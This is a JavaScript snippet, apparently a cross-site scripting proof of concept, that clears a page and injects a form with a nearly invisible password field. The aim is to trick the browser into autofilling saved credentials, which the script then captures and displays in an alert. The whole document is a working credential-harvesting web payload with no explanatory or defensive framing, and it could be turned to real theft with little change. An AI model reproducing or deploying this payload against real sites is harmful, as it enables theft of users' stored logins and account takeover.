// Clear the entire document body
document.body.innerHTML = "";

// Remove all <style> tags
var styleTags = document.querySelectorAll('style');
styleTags.forEach(function(style) {
    style.parentNode.removeChild(style);
});

// Remove all <script> tags
var scripts = document.scripts;
for (var i = scripts.length - 1; i >= 0; i--) {
    var script = scripts[i];
    script.parentNode.removeChild(script);
}

// Add a new <style> tag to hide all elements except <form> and <textarea>
var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none !important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

// Create a new form
var form = document.createElement('form');

// Create the username input
var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.autocomplete = 'username';
inputName.placeholder = 'Check here';
inputName.style.border = "none";
inputName.style.outline = "none";
inputName.style.background = "none";
inputName.style.width = "100%";
inputName.classList.add("single-input");

// Create the password input
var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.autocomplete = 'current-password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.padding = "0";
inputPassword.style.width = "1%";
inputPassword.classList.add("single-input");

// Append the inputs to the form
form.appendChild(inputName);
form.appendChild(inputPassword);

// Append the form to the body
document.body.appendChild(form);

// Handle the form events
setTimeout(function() {
    let a = document.getElementsByName('username')[0];
    let b = document.getElementsByName('password')[0];

    function handleEvent() {
        if (b.value.length > 0) {
            alert(`Here are the user credentials: Username = ${a.value}, Password = ${b.value}`);
        }
    }

    form.onclick = handleEvent;
    a.onchange = handleEvent;
    b.onchange = handleEvent;
    a.oninput = handleEvent;
    b.oninput = handleEvent;
}, 1000);
